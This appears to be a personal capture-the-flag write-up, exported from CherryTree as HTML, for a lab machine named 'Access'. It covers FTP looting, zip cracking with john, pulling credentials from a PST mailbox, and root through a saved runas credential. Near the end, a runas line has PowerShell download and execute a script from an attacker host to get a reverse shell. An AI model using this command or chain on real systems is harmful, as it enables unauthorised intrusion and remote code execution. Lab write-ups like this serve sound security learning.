<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>10.10.10.98 Access</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>10.10.10.98 Access</h1><br/>nmap showed that ftp, telnet, and http were open.<br />FTP anonymous was enabled and I was able to wget 2 files “Access Control.zip” and backup.mdb<br />using strings I pulled all strings of 8 letters or greater to make words.txt<br />zip2john on “Access Contorl.zip” (making AChash.txt)<br />used john on AChash.txt against words.txt and got the password         access4u@security       to open the zip file<br />used 7z and the new password to unzip &quot;Access Control.zip&quot; <br />new file is “Access Control.pst”<br />used readpst to create “Access Control.mbox”<br />Reading through “Access Control.mbox” gave me the username and password security:4Cc3ssC0ntr0ller<br />The creds were successful for telnet!<br />User flag owned!<br />while dir-ing around I saw that the desktop dir of the public users was hidden<br />inside the desktop dir was a link the file “ZKAccess3.5 Security System.lnk”<br />typeing it showed that it was running some kind of runas command and the /savecred argument. a microsoft lnk vulnerability!<br />This command with a nc listener brought it home<br />    runas /user:ACCESS\Administrator /savecred &quot;powershell \&quot;IEX(new-object net.webclient).downloadstring(&#39;<a href="http://10.10.14.60:8000/iptcp.ps1')">http://10.10.14.60:8000/iptcp.ps1&#39;)</a><br />    <br />    Rooted!!<br /><br /><br /><br /><br /><br /><br /><br /><br /><br />4Cc3ssC0ntr0ller</div></body></html>